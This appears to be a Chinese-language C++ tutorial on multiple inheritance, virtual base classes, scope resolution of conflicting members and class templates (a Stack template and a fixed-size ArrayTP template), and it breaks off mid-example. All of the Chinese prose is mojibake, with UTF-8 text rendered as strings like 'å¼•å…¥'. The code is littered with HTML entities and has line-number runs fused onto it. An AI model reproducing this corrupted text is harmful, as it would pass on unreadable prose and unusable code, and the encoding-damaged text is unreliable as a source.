å¼•å…¥äº†è™šåŸºç±»çš„æ¦‚å¿µã€‚å½“ä¸€ä¸ªç±»è¢«å£°æ˜ä¸ºè™šåŸºç±»æ—¶ï¼Œæ´¾ç”Ÿç±»åœ¨é€šè¿‡å¤šæ¡è·¯å¾„ç»§æ‰¿è¯¥åŸºç±»æ—¶ï¼Œåªä¼šåŒ…å«è¯¥è™šåŸºç±»çš„ä¸€ä¸ªå…±äº«å­å¯¹è±¡å‰¯æœ¬ã€‚ è¯­æ³•: åœ¨æ´¾ç”Ÿç±»ç»§æ‰¿è™šåŸºç±»æ—¶ï¼Œä½¿ç”¨ virtual å…³é”®å­—ã€‚ 123456// Waiter å’Œ Singer å°† Worker ä½œä¸ºè™šåŸºç±»ç»§æ‰¿class Waiter : virtual public Worker &#123; /* ... */ &#125;;class Singer : virtual public Worker &#123; /* ... */ &#125;;// SingingWaiter æ­£å¸¸ç»§æ‰¿ Waiter å’Œ Singerclass SingingWaiter : public Waiter, public Singer &#123; /* ... */ &#125;; æ•ˆæœ: ç°åœ¨ï¼ŒSingingWaiter å¯¹è±¡åªåŒ…å«ä¸€ä¸ªå…±äº«çš„ Worker å­å¯¹è±¡ã€‚è®¿é—® id æˆ– fullname ä¸å†æœ‰æ­§ä¹‰ã€‚ 12SingingWaiter sw;sw.id = 123; // OKï¼åªæœ‰ä¸€ä¸ª Worker å­å¯¹è±¡ï¼Œæ²¡æœ‰æ­§ä¹‰ã€‚ æ„é€ å‡½æ•°è´£ä»»: å½“ä½¿ç”¨è™šåŸºç±»æ—¶ï¼Œæœ€åº•å±‚çš„æ´¾ç”Ÿç±»ï¼ˆåœ¨è¿™ä¸ªä¾‹å­ä¸­æ˜¯ SingingWaiterï¼‰çš„æ„é€ å‡½æ•°è´Ÿè´£è°ƒç”¨è™šåŸºç±»ï¼ˆWorkerï¼‰çš„æ„é€ å‡½æ•°ã€‚ä¸­é—´çš„åŸºç±»ï¼ˆWaiter, Singerï¼‰åœ¨å…¶åˆå§‹åŒ–åˆ—è¡¨ä¸­å¯¹è™šåŸºç±»çš„æ„é€ å‡½æ•°è°ƒç”¨ä¼šè¢«å¿½ç•¥ï¼ˆé™¤éè¯¥ä¸­é—´ç±»æ˜¯ç›´æ¥åˆ›å»ºå¯¹è±¡ï¼‰ã€‚ 1234567// SingingWaiter æ„é€ å‡½æ•°éœ€è¦åˆå§‹åŒ– WorkerSingingWaiter::SingingWaiter(const Worker &amp; wk, int p, int v) : Worker(wk), // æ˜¾å¼è°ƒç”¨è™šåŸºç±»æ„é€ å‡½æ•° Waiter(wk, p), Singer(wk, v) &#123; // Waiter(wk, p) å’Œ Singer(wk, v) å†…éƒ¨å¯¹ Worker çš„æ„é€ è°ƒç”¨ä¼šè¢«å¿½ç•¥&#125; 14.3.2 å“ªä¸ªæ–¹æ³• (æˆå‘˜åå†²çª)å³ä½¿æ²¡æœ‰é’»çŸ³é—®é¢˜ï¼Œå¦‚æœä¸åŒçš„åŸºç±»æä¾›äº†åŒåçš„æ–¹æ³•æˆ–æ•°æ®æˆå‘˜ï¼Œæ´¾ç”Ÿç±»åœ¨è°ƒç”¨è¯¥æˆå‘˜æ—¶ä¹Ÿä¼šäº§ç”Ÿæ­§ä¹‰ã€‚ ç¤ºä¾‹: å‡è®¾ Waiter å’Œ Singer éƒ½æœ‰ä¸€ä¸ªåä¸º Talent() çš„æ–¹æ³•ã€‚ 12345678910111213141516class Waiter &#123;public: void Talent() const &#123; std::cout &lt;&lt; &quot;Serves with style.\\n&quot;; &#125; // ...&#125;;class Singer &#123;public: void Talent() const &#123; std::cout &lt;&lt; &quot;Sings beautifully.\\n&quot;; &#125; // ...&#125;;class SingingWaiter : public Waiter, public Singer &#123; // ...&#125;;SingingWaiter sw;// sw.Talent(); // é”™è¯¯ï¼æ­§ä¹‰ï¼šWaiter::Talent() è¿˜æ˜¯ Singer::Talent()ï¼Ÿ è§£å†³æ–¹æ¡ˆï¼šä½¿ç”¨ä½œç”¨åŸŸè§£æè¿ç®—ç¬¦ (::) ä¸ºäº†è§£å†³è¿™ç§æ­§ä¹‰ï¼Œéœ€è¦ä½¿ç”¨ä½œç”¨åŸŸè§£æè¿ç®—ç¬¦æ˜ç¡®æŒ‡å®šè¦è°ƒç”¨å“ªä¸ªåŸºç±»çš„ç‰ˆæœ¬ï¼š 12sw.Waiter::Talent(); // è°ƒç”¨ Waiter ç‰ˆæœ¬çš„ Talent()sw.Singer::Talent(); // è°ƒç”¨ Singer ç‰ˆæœ¬çš„ Talent() è™šå‡½æ•°å’Œæ­§ä¹‰: å¦‚æœå†²çªçš„æ–¹æ³•æ˜¯è™šå‡½æ•°ï¼Œæƒ…å†µä¼šæ›´å¤æ‚ä¸€äº›ã€‚ å¦‚æœåªæœ‰ä¸€ä¸ªåŸºç±»æä¾›äº†è¯¥è™šå‡½æ•°ï¼Œæˆ–è€…æ‰€æœ‰æä¾›è¯¥è™šå‡½æ•°çš„åŸºç±»éƒ½ç»§æ‰¿è‡ªåŒä¸€ä¸ªï¼ˆå¯èƒ½æ˜¯è™šï¼‰åŸºç±»çš„åŒä¸€ä¸ªè™šå‡½æ•°ï¼Œé‚£ä¹ˆé€šè¿‡æ´¾ç”Ÿç±»å¯¹è±¡è°ƒç”¨é€šå¸¸æ²¡æœ‰æ­§ä¹‰ï¼ˆåŠ¨æ€è”ç¼–ä¼šèµ·ä½œç”¨ï¼‰ã€‚ ä½†æ˜¯ï¼Œå¦‚æœä¸åŒçš„åŸºç±»æä¾›äº†ç­¾åç›¸åŒä½†æ— å…³çš„è™šå‡½æ•°ï¼Œæˆ–è€…æ´¾ç”Ÿç±»æƒ³æä¾›ä¸€ä¸ªè¦†ç›–æ‰€æœ‰åŸºç±»ç‰ˆæœ¬çš„æ–°ç‰ˆæœ¬ï¼Œæƒ…å†µä¼šå˜å¾—å¤æ‚ã€‚é€šå¸¸å»ºè®®åœ¨æ´¾ç”Ÿç±»ä¸­æä¾›ä¸€ä¸ªæ–°çš„è™šå‡½æ•°ï¼Œå¹¶æ˜¾å¼è°ƒç”¨æ‰€éœ€çš„åŸºç±»ç‰ˆæœ¬ã€‚ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113// workermi.h, workermi.cpp, worktest.cpp ç¤ºä¾‹ (æ¨¡æ‹Ÿ Worker å±‚æ¬¡ç»“æ„)// worker0.h - åŸºç±» Worker#ifndef WORKER0_H_#define WORKER0_H_#include &lt;string&gt;// ... (Worker å®šä¹‰ï¼ŒåŒ…å«è™šå‡½æ•° Show() å’Œ Set()) ...#endif// workermi.h - MI ç›¸å…³ç±»#ifndef WORKERMI_H_#define WORKERMI_H_#include &quot;worker0.h&quot; // åŒ…å«åŸºç±»#include &lt;iostream&gt;class Waiter : virtual public Worker &#123; // è™šç»§æ‰¿private: int panache;protected: void Data() const; void Get();public: Waiter() : Worker(), panache(0) &#123;&#125; Waiter(const std::string &amp; s, long n, int p = 0) : Worker(s, n), panache(p) &#123;&#125; Waiter(const Worker &amp; wk, int p = 0) : Worker(wk), panache(p) &#123;&#125; void Set(); void Show() const; // ...&#125;;class Singer : virtual public Worker &#123; // è™šç»§æ‰¿protected: enum &#123;other, alto, contralto, soprano, bass, baritone, tenor&#125;; enum &#123;Vtypes = 7&#125;; void Data() const; void Get();private: static const char *pv[Vtypes]; // string equivs of voice types int voice;public: Singer() : Worker(), voice(other) &#123;&#125; Singer(const std::string &amp; s, long n, int v = other) : Worker(s, n), voice(v) &#123;&#125; Singer(const Worker &amp; wk, int v = other) : Worker(wk), voice(v) &#123;&#125; void Set(); void Show() const; // ...&#125;;// å¤šé‡ç»§æ‰¿class SingingWaiter : public Singer, public Waiter &#123;protected: void Data() const; void Get();public: SingingWaiter() &#123;&#125; // æ˜¾å¼è°ƒç”¨è™šåŸºç±» Worker çš„æ„é€ å‡½æ•° SingingWaiter(const std::string &amp; s, long n, int p = 0, int v = other) : Worker(s, n), Waiter(s, n, p), Singer(s, n, v) &#123;&#125; SingingWaiter(const Worker &amp; wk, int p = 0, int v = other) : Worker(wk), Waiter(wk, p), Singer(wk, v) &#123;&#125; SingingWaiter(const Waiter &amp; wt, int v = other) : Worker(wt), Waiter(wt), Singer(wt, v) &#123;&#125; // ä» Waiter æ„é€  SingingWaiter(const Singer &amp; sg, int p = 0) : Worker(sg), Waiter(sg, p), Singer(sg) &#123;&#125; // ä» Singer æ„é€  void Set(); void Show() const;&#125;;#endif// workermi.cpp - å®ç° (éƒ¨åˆ†)#include &quot;workermi.h&quot;// ... Worker å®ç° ...// --- Waiter methods ---void Waiter::Set() &#123; Worker::Get(); // è°ƒç”¨åŸºç±»æ–¹æ³•è·å–åŸºæœ¬ä¿¡æ¯ Get(); // è°ƒç”¨è‡ªå·±çš„ Get è·å– panache&#125;void Waiter::Show() const &#123; Worker::Show(); // è°ƒç”¨åŸºç±»æ–¹æ³•æ˜¾ç¤ºåŸºæœ¬ä¿¡æ¯ Data(); // è°ƒç”¨è‡ªå·±çš„ Data æ˜¾ç¤º panache&#125;void Waiter::Data() const &#123; /* show panache */ &#125;void Waiter::Get() &#123; /* get panache */ &#125;// --- Singer methods ---// ... (ç±»ä¼¼å®ç° Set, Show, Data, Get) ...// --- SingingWaiter methods ---void SingingWaiter::Data() const &#123; Singer::Data(); // æ˜¾ç¤º Singer çš„æ•°æ® Waiter::Data(); // æ˜¾ç¤º Waiter çš„æ•°æ®&#125;void SingingWaiter::Get() &#123; Waiter::Get(); // è·å– Waiter çš„æ•°æ® Singer::Get(); // è·å– Singer çš„æ•°æ®&#125;void SingingWaiter::Set() &#123; Worker::Get(); // è·å– Worker çš„æ•°æ® (åªéœ€è¦ä¸€æ¬¡ï¼Œå› ä¸ºæ˜¯è™šåŸºç±») Get(); // è°ƒç”¨ SingingWaiter::Get() è·å– Waiter å’Œ Singer çš„æ•°æ®&#125;void SingingWaiter::Show() const &#123; Worker::Show(); // æ˜¾ç¤º Worker çš„æ•°æ® (åªéœ€è¦ä¸€æ¬¡) Data(); // è°ƒç”¨ SingingWaiter::Data() æ˜¾ç¤º Waiter å’Œ Singer çš„æ•°æ®&#125;// worktest.cpp - ä½¿ç”¨ç¤ºä¾‹#include &lt;iostream&gt;#include &quot;workermi.h&quot;// ... (main å‡½æ•°åˆ›å»º Worker*, Waiter*, Singer*, SingingWaiter* æ•°ç»„ï¼Œå¹¶é€šè¿‡åŸºç±»æŒ‡é’ˆè°ƒç”¨ Set å’Œ Show) ... 14.3.3 MI å°ç»“ä¼˜ç‚¹: å¯ä»¥ç»„åˆå¤šä¸ªä¸åŒç±»çš„åŠŸèƒ½ã€‚ å…è®¸æ›´çµæ´»çš„ç±»å±‚æ¬¡ç»“æ„è®¾è®¡ã€‚ ç¼ºç‚¹: å¤æ‚æ€§å¢åŠ : å¯èƒ½å¯¼è‡´åç§°å†²çªå’Œæ­§ä¹‰ã€‚ é’»çŸ³é—®é¢˜: éœ€è¦ä½¿ç”¨è™šåŸºç±»æ¥è§£å†³ï¼Œè¿™ä¼šå¢åŠ æ„é€ å‡½æ•°å®ç°çš„å¤æ‚æ€§ï¼Œå¹¶å¯èƒ½å¼•å…¥é¢å¤–çš„è¿è¡Œæ—¶å¼€é”€ã€‚ éš¾ä»¥ç†è§£å’Œç»´æŠ¤: å¤æ‚çš„ MI å±‚æ¬¡ç»“æ„å¯èƒ½éš¾ä»¥ç†è§£å’Œè°ƒè¯•ã€‚ è®¾è®¡å»ºè®®: è°¨æ…ä½¿ç”¨: å¤šé‡ç»§æ‰¿æ˜¯ä¸€ä¸ªå¼ºå¤§çš„å·¥å…·ï¼Œä½†ä¹Ÿå®¹æ˜“è¢«æ»¥ç”¨ã€‚åœ¨å†³å®šä½¿ç”¨ MI ä¹‹å‰ï¼Œä»”ç»†è€ƒè™‘æ˜¯å¦æœ‰æ›´ç®€å•çš„æ›¿ä»£æ–¹æ¡ˆï¼ˆå¦‚åŒ…å«/ç»„åˆï¼Œæˆ–è€…å•ç»§æ‰¿åŠ æ¥å£ï¼‰ã€‚ ä¼˜å…ˆè€ƒè™‘ç»„åˆ: å¯¹äº â€œhas-aâ€ å…³ç³»ï¼Œç»„åˆé€šå¸¸æ˜¯æ›´ç®€å•ã€æ›´å®‰å…¨çš„é€‰æ‹©ã€‚ è™šåŸºç±»: å¦‚æœç¡®å®éœ€è¦ MI å¹¶ä¸”é‡åˆ°äº†é’»çŸ³é—®é¢˜ï¼ŒåŠ¡å¿…ä½¿ç”¨è™šåŸºç±»ã€‚ æ˜ç¡®è§£å†³æ­§ä¹‰: ä½¿ç”¨ä½œç”¨åŸŸè§£æè¿ç®—ç¬¦ (::) æ¥è§£å†³æˆå‘˜åç§°å†²çªã€‚ è®¸å¤šç°ä»£ C++ å®è·µå€¾å‘äºé¿å…å¤æ‚çš„å¤šé‡ç»§æ‰¿ï¼Œå°¤å…¶æ˜¯åœ¨åº”ç”¨å±‚é¢ã€‚ç„¶è€Œï¼Œåœ¨æŸäº›åº“è®¾è®¡ï¼ˆå¦‚ IO æµåº“ï¼‰æˆ–éœ€è¦æ··åˆä¸åŒæŠ½è±¡æ¥å£çš„åœºæ™¯ä¸­ï¼ŒMI ä»ç„¶æ˜¯ä¸€ä¸ªæœ‰ç”¨çš„å·¥å…·ã€‚ 14.4 ç±»æ¨¡æ¿å°±åƒå‡½æ•°æ¨¡æ¿å…è®¸æˆ‘ä»¬ç¼–å†™é€šç”¨çš„å‡½æ•°ï¼Œå¯ä»¥å¤„ç†ä¸åŒç±»å‹çš„æ•°æ®ä¸€æ ·ï¼Œç±»æ¨¡æ¿ (Class Templates) å…è®¸æˆ‘ä»¬å®šä¹‰é€šç”¨çš„ç±»è“å›¾ï¼Œå¯ä»¥ç”¨æ¥åˆ›å»ºå¤„ç†ä¸åŒæ•°æ®ç±»å‹çš„ç±»ã€‚ ç±»æ¨¡æ¿æ˜¯å‚æ•°åŒ–çš„ç±»å®šä¹‰ï¼Œå…¶ä¸­çš„æŸäº›ç±»å‹ï¼ˆæˆ–å€¼ï¼‰åœ¨å®šä¹‰æ—¶æ˜¯æœªæŒ‡å®šçš„ï¼Œè€Œåœ¨åˆ›å»ºç±»çš„å®ä¾‹ï¼ˆå¯¹è±¡ï¼‰æ—¶æ‰è¢«æŒ‡å®šã€‚è¿™æå¤§åœ°æé«˜äº†ä»£ç çš„é‡ç”¨æ€§ï¼Œæ˜¯æ³›å‹ç¼–ç¨‹çš„æ ¸å¿ƒã€‚STL ä¸­çš„å®¹å™¨ï¼ˆå¦‚ vector, list, mapï¼‰å’Œæ™ºèƒ½æŒ‡é’ˆç­‰éƒ½æ˜¯ç±»æ¨¡æ¿çš„å…¸å‹åº”ç”¨ã€‚ 14.4.1 å®šä¹‰ç±»æ¨¡æ¿å®šä¹‰ç±»æ¨¡æ¿çš„è¯­æ³•ä¸å‡½æ•°æ¨¡æ¿ç±»ä¼¼ï¼Œä½¿ç”¨ template å…³é”®å­—ï¼Œåè·Ÿå°–æ‹¬å· &lt;&gt; ä¸­çš„æ¨¡æ¿å‚æ•°åˆ—è¡¨ã€‚ è¯­æ³•: 123456789101112131415161718192021222324template &lt;typename T1, typename T2, ...&gt; // æˆ–è€… template &lt;class T1, class T2, ...&gt;class ClassName &#123; // ç±»å®šä¹‰ï¼Œå¯ä»¥ä½¿ç”¨æ¨¡æ¿å‚æ•° T1, T2 ç­‰ä½œä¸ºç±»å‹private: T1 member1; T2 member2; // ...public: ClassName(const T1 &amp; val1, const T2 &amp; val2); T1 getMember1() const; // ...&#125;;// æˆå‘˜å‡½æ•°çš„å®šä¹‰ä¹Ÿéœ€è¦æ¨¡æ¿å‰ç¼€template &lt;typename T1, typename T2, ...&gt;ClassName&lt;T1, T2, ...&gt;::ClassName(const T1 &amp; val1, const T2 &amp; val2) : member1(val1), member2(val2) &#123; // ...&#125;template &lt;typename T1, typename T2, ...&gt;T1 ClassName&lt;T1, T2, ...&gt;::getMember1() const &#123; return member1;&#125; template &lt;typename T&gt; æˆ– template &lt;class T&gt;: å£°æ˜ä¸€ä¸ªæ¨¡æ¿ï¼ŒT æ˜¯ä¸€ä¸ªç±»å‹å‚æ•°çš„å ä½ç¬¦ã€‚typename å’Œ class åœ¨è¿™é‡Œæ˜¯ç­‰ä»·çš„ã€‚ä½ å¯ä»¥ä½¿ç”¨ä»»ä½•æœ‰æ•ˆçš„æ ‡è¯†ç¬¦ä½œä¸ºç±»å‹å‚æ•°åï¼ˆé€šå¸¸ç”¨ T, U, V ç­‰ï¼‰ã€‚ åœ¨ç±»å®šä¹‰å†…éƒ¨ï¼Œå¯ä»¥ä½¿ç”¨æ¨¡æ¿å‚æ•° T å°±åƒä½¿ç”¨æ™®é€šç±»å‹ä¸€æ ·ï¼ˆä¾‹å¦‚ï¼Œå®šä¹‰æˆå‘˜å˜é‡ç±»å‹ã€å‡½æ•°å‚æ•°ç±»å‹ã€è¿”å›å€¼ç±»å‹ï¼‰ã€‚ æˆå‘˜å‡½æ•°å®šä¹‰: å½“åœ¨ç±»å¤–éƒ¨å®šä¹‰æ¨¡æ¿ç±»çš„æˆå‘˜å‡½æ•°æ—¶ï¼Œå¿…é¡»å†æ¬¡ä½¿ç”¨ template &lt;...&gt; å‰ç¼€ï¼Œå¹¶ä¸”åœ¨ç±»ååé¢è·Ÿä¸Šæ¨¡æ¿å‚æ•°åˆ—è¡¨ &lt;T1, T2, ...&gt;ã€‚ ç¤ºä¾‹ï¼šç®€å•çš„ Stack æ¨¡æ¿ç±» 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556// stacktp.h -- ä¸€ä¸ªç®€å•çš„æ ˆæ¨¡æ¿ç±»å®šä¹‰#ifndef STACKTP_H_#define STACKTP_H_template &lt;typename T&gt; // æˆ–è€… template &lt;class T&gt;class Stack &#123;private: enum &#123; MAX = 10 &#125;; // æ ˆçš„æœ€å¤§å®¹é‡ (éç±»å‹å‚æ•°å¯ä»¥æ”¹è¿›) T items[MAX]; // å­˜å‚¨æ ˆå…ƒç´ çš„æ•°ç»„ï¼Œç±»å‹ä¸º T int top; // æ ˆé¡¶ç´¢å¼•public: Stack(); bool isempty() const; bool isfull() const; // push() returns false if stack already is full, true otherwise bool push(const T &amp; item); // å‚æ•°ç±»å‹ä¸º T // pop() returns false if stack already is empty, true otherwise bool pop(T &amp; item); // å‚æ•°ç±»å‹ä¸º T (é€šè¿‡å¼•ç”¨è¿”å›å¼¹å‡ºçš„å…ƒç´ )&#125;;// æˆå‘˜å‡½æ•°å®ç° (é€šå¸¸ä¹Ÿæ”¾åœ¨å¤´æ–‡ä»¶ä¸­)template &lt;typename T&gt;Stack&lt;T&gt;::Stack() : top(0) &#123; // åˆå§‹åŒ–æ ˆé¡¶&#125;template &lt;typename T&gt;bool Stack&lt;T&gt;::isempty() const &#123; return top == 0;&#125;template &lt;typename T&gt;bool Stack&lt;T&gt;::isfull() const &#123; return top == MAX;&#125;template &lt;typename T&gt;bool Stack&lt;T&gt;::push(const T &amp; item) &#123; if (top &lt; MAX) &#123; items[top++] = item; // ä½¿ç”¨ç±»å‹ T çš„èµ‹å€¼æ“ä½œ return true; &#125; else &#123; return false; &#125;&#125;template &lt;typename T&gt;bool Stack&lt;T&gt;::pop(T &amp; item) &#123; if (top &gt; 0) &#123; item = items[--top]; // ä½¿ç”¨ç±»å‹ T çš„èµ‹å€¼æ“ä½œ return true; &#125; else &#123; return false; &#125;&#125;#endif // STACKTP_H_ 14.4.2 ä½¿ç”¨æ¨¡æ¿ç±»è¦ä½¿ç”¨ç±»æ¨¡æ¿ï¼Œä½ éœ€è¦å®ä¾‹åŒ– (Instantiate) å®ƒã€‚å®ä¾‹åŒ–æ˜¯æŒ‡ä¸ºæ¨¡æ¿å‚æ•°æä¾›å…·ä½“çš„ç±»å‹ï¼ˆæˆ–å€¼ï¼‰ï¼Œä»è€Œåˆ›å»ºä¸€ä¸ªå…·ä½“çš„ç±»ã€‚ è¯­æ³•: 1ClassName&lt;ConcreteType1, ConcreteType2, ...&gt; objectName(constructor_arguments); åœ¨ç±»æ¨¡æ¿åç§°åé¢è·Ÿä¸Šå°–æ‹¬å· &lt;&gt;ï¼Œå¹¶åœ¨å…¶ä¸­æŒ‡å®šç”¨äºæ›¿æ¢æ¨¡æ¿å‚æ•°çš„å…·ä½“ç±»å‹ã€‚ ç„¶ååƒåˆ›å»ºæ™®é€šç±»çš„å¯¹è±¡ä¸€æ ·å£°æ˜å¯¹è±¡å¹¶è°ƒç”¨æ„é€ å‡½æ•°ã€‚ ç¤ºä¾‹ï¼šä½¿ç”¨ Stack æ¨¡æ¿ 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647// stack_user.cpp -- ä½¿ç”¨ Stack æ¨¡æ¿ç±»#include &lt;iostream&gt;#include &lt;string&gt;#include &lt;cctype&gt; // for isalpha, etc. (å‡è®¾ç”¨äºå¤„ç†è¾“å…¥)#include &quot;stacktp.h&quot; // åŒ…å«æ¨¡æ¿å®šä¹‰int main() &#123; // å®ä¾‹åŒ–ä¸€ä¸ªå¤„ç† int çš„æ ˆ Stack&lt;int&gt; intStack; // intStack æ˜¯ä¸€ä¸ª Stack&lt;int&gt; ç±»å‹çš„å¯¹è±¡ int i = 0; std::cout &lt;&lt; &quot;Pushing integers onto intStack:\\n&quot;; while (!intStack.isfull() &amp;&amp; i &lt; 5) &#123; intStack.push(i++); std::cout &lt;&lt; i-1 &lt;&lt; &quot; pushed. &quot;; &#125; std::cout &lt;&lt; std::endl; int tempInt; std::cout &lt;&lt; &quot;Popping integers from intStack:\\n&quot;; while (intStack.pop(tempInt)) &#123; std::cout &lt;&lt; tempInt &lt;&lt; &quot; popped. &quot;; &#125; std::cout &lt;&lt; std::endl; // å®ä¾‹åŒ–ä¸€ä¸ªå¤„ç† string çš„æ ˆ Stack&lt;std::string&gt; stringStack; // stringStack æ˜¯ä¸€ä¸ª Stack&lt;std::string&gt; å¯¹è±¡ std::string items[] = &#123;&quot;apple&quot;, &quot;banana&quot;, &quot;cherry&quot;&#125;; std::cout &lt;&lt; &quot;Pushing strings onto stringStack:\\n&quot;; for (const auto&amp; s : items) &#123; if (stringStack.push(s)) &#123; std::cout &lt;&lt; &quot;\\&quot;&quot; &lt;&lt; s &lt;&lt; &quot;\\&quot; pushed. &quot;; &#125; else &#123; std::cout &lt;&lt; &quot;Stack full, cannot push \\&quot;&quot; &lt;&lt; s &lt;&lt; &quot;\\&quot;.\\n&quot;; break; &#125; &#125; std::cout &lt;&lt; std::endl; std::string tempString; std::cout &lt;&lt; &quot;Popping strings from stringStack:\\n&quot;; while (stringStack.pop(tempString)) &#123; std::cout &lt;&lt; &quot;\\&quot;&quot; &lt;&lt; tempString &lt;&lt; &quot;\\&quot; popped. &quot;; &#125; std::cout &lt;&lt; std::endl; return 0;&#125; ç¼–è¯‘å’Œè¿è¡Œ: ç”±äºæ¨¡æ¿çš„å®ç°é€šå¸¸æ”¾åœ¨å¤´æ–‡ä»¶ä¸­ï¼Œä½ åªéœ€è¦ç¼–è¯‘ä½¿ç”¨æ¨¡æ¿çš„æºæ–‡ä»¶ã€‚ 12g++ stack_user.cpp -o stack_user./stack_user è¾“å‡º: 12345678Pushing integers onto intStack:0 pushed. 1 pushed. 2 pushed. 3 pushed. 4 pushed.Popping integers from intStack:4 popped. 3 popped. 2 popped. 1 popped. 0 popped.Pushing strings onto stringStack:&quot;apple&quot; pushed. &quot;banana&quot; pushed. &quot;cherry&quot; pushed.Popping strings from stringStack:&quot;cherry&quot; popped. &quot;banana&quot; popped. &quot;apple&quot; popped. 14.4.3 æ·±å…¥æ¢è®¨æ¨¡æ¿ç±» æ¨¡æ¿ç¼–è¯‘æ¨¡å‹: ç±»æ¨¡æ¿æœ¬èº«å¹¶ä¸ä¼šè¢«ç¼–è¯‘æˆä»£ç ã€‚åªæœ‰å½“ä½ ç”¨å…·ä½“ç±»å‹å®ä¾‹åŒ–æ¨¡æ¿æ—¶ï¼Œç¼–è¯‘å™¨æ‰ä¼šæ ¹æ®æä¾›çš„ç±»å‹ç”Ÿæˆå¯¹åº”çš„å…·ä½“ç±»ï¼ˆä¾‹å¦‚ Stack&lt;int&gt; ç±»å’Œ Stack&lt;string&gt; ç±»ï¼‰çš„ä»£ç ã€‚è¿™ä¸ªè¿‡ç¨‹ç§°ä¸º**æ¨¡æ¿å®ä¾‹åŒ– (Template Instantiation)**ã€‚ å®ç°æ”¾åœ¨å¤´æ–‡ä»¶: ç”±äºç¼–è¯‘å™¨åœ¨å®ä¾‹åŒ–æ¨¡æ¿æ—¶éœ€è¦çœ‹åˆ°æ¨¡æ¿çš„å®Œæ•´å®šä¹‰ï¼ˆåŒ…æ‹¬æˆå‘˜å‡½æ•°çš„å®ç°ï¼‰ï¼Œæ‰€ä»¥ç±»æ¨¡æ¿çš„æˆå‘˜å‡½æ•°å®ç°é€šå¸¸ä¹Ÿæ”¾åœ¨å¤´æ–‡ä»¶ä¸­ (.h æˆ– .hpp)ï¼Œè€Œä¸æ˜¯å•ç‹¬çš„ .cpp æ–‡ä»¶ä¸­ã€‚å¦‚æœæ”¾åœ¨ .cpp æ–‡ä»¶ä¸­ï¼Œé“¾æ¥å™¨åœ¨é“¾æ¥å…¶ä»–ä½¿ç”¨è¯¥æ¨¡æ¿çš„ .cpp æ–‡ä»¶æ—¶ï¼Œå¯èƒ½æ‰¾ä¸åˆ°æ‰€éœ€å®ä¾‹åŒ–çš„ä»£ç ã€‚ éšå¼å®ä¾‹åŒ– (Implicit Instantiation): å½“ä½ å£°æ˜ä¸€ä¸ªç‰¹å®šç±»å‹çš„æ¨¡æ¿ç±»å¯¹è±¡æ—¶ï¼ˆå¦‚ Stack&lt;int&gt; s;ï¼‰ï¼Œç¼–è¯‘å™¨ä¼šè‡ªåŠ¨è¿›è¡Œéšå¼å®ä¾‹åŒ–ã€‚ æ˜¾å¼å®ä¾‹åŒ– (Explicit Instantiation): ä½ å¯ä»¥æ˜¾å¼åœ°æŒ‡ç¤ºç¼–è¯‘å™¨åˆ›å»ºä¸€ä¸ªç‰¹å®šç±»å‹çš„å®ä¾‹ï¼Œå³ä½¿ä»£ç ä¸­æ²¡æœ‰ç›´æ¥ä½¿ç”¨è¯¥ç±»å‹çš„å¯¹è±¡ã€‚è¿™åœ¨æŸäº›åº“è®¾è®¡æˆ–æ„å»ºè¿‡ç¨‹ä¸­å¯èƒ½æœ‰ç”¨ã€‚ 1template class Stack&lt;double&gt;; // åœ¨æŸä¸ª .cpp æ–‡ä»¶ä¸­æ˜¾å¼å®ä¾‹åŒ– Stack&lt;double&gt; ç±»å‹è¦æ±‚: æ¨¡æ¿ä»£ç å¯¹ç”¨ä½œæ¨¡æ¿å‚æ•°çš„ç±»å‹é€šå¸¸æœ‰ä¸€äº›éšå¼è¦æ±‚ã€‚ä¾‹å¦‚ï¼ŒStack æ¨¡æ¿è¦æ±‚ç±»å‹ T å…·æœ‰å¯ç”¨çš„èµ‹å€¼è¿ç®—ç¬¦ (operator=)ï¼Œå› ä¸º push å’Œ pop æ–¹æ³•ä¸­ä½¿ç”¨äº†èµ‹å€¼ã€‚å¦‚æœå°è¯•ç”¨ä¸æ»¡è¶³è¿™äº›è¦æ±‚çš„ç±»å‹ï¼ˆå¦‚æ²¡æœ‰èµ‹å€¼è¿ç®—ç¬¦çš„ç±»ï¼‰å®ä¾‹åŒ–æ¨¡æ¿ï¼Œç¼–è¯‘å™¨ä¼šæŠ¥é”™ã€‚ 14.4.4 æ•°ç»„æ¨¡æ¿ç¤ºä¾‹å’Œéç±»å‹å‚æ•°ç±»æ¨¡æ¿ä¸ä»…å¯ä»¥æœ‰ç±»å‹å‚æ•° (typename T æˆ– class T)ï¼Œè¿˜å¯ä»¥æœ‰**éç±»å‹å‚æ•° (Non-type Parameters)**ã€‚éç±»å‹å‚æ•°æ˜¯å…·æœ‰å›ºå®šç±»å‹çš„å€¼ï¼Œé€šå¸¸æ˜¯æ•´å‹ï¼ˆint, size_t ç­‰ï¼‰ã€æŒ‡é’ˆã€å¼•ç”¨æˆ–æšä¸¾ã€‚ è¯­æ³•: 123456789template &lt;typename T, int N&gt; // T æ˜¯ç±»å‹å‚æ•°ï¼ŒN æ˜¯éç±»å‹å‚æ•° (int ç±»å‹)class ArrayTP &#123;private: T ar[N]; // æ•°ç»„å¤§å°ç”±æ¨¡æ¿å‚æ•° N å†³å®š // ...public: T &amp; operator[](int i); // ...&#125;; éç±»å‹å‚æ•° N æˆä¸ºæ¨¡æ¿å®šä¹‰çš„ä¸€éƒ¨åˆ†ã€‚ åœ¨å®ä¾‹åŒ–æ—¶ï¼Œå¿…é¡»ä¸ºéç±»å‹å‚æ•°æä¾›ä¸€ä¸ªå¸¸é‡è¡¨è¾¾å¼ã€‚ ç¤ºä¾‹ï¼šå›ºå®šå¤§å°çš„æ•°ç»„æ¨¡æ¿ ArrayTP 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778// arraytp.h -- æ¨¡æ¿ç±» ArrayTP#ifndef ARRAYTP_H_#define ARRAYTP_H_#include &lt;iostream&gt;#include &lt;cstdlib&gt; // for exit()template &lt;typename T, int n&gt; // n æ˜¯éç±»å‹å‚æ•°class ArrayTP &#123;private: T ar[n]; // æ•°ç»„å¤§å°ä¸º npublic: ArrayTP() &#123;&#125;; explicit ArrayTP(const T &amp; v); virtual T &amp; operator[](int i); virtual T operator[](int i) const;&#125;;template &lt;typename T, int n&gt;ArrayTP&lt;T, n&gt;::ArrayTP(const T &amp; v) &#123; for (int i = 0; i &lt; n; i++) ar[i] = v;&#125;template &lt;typename T, int n&gt;T 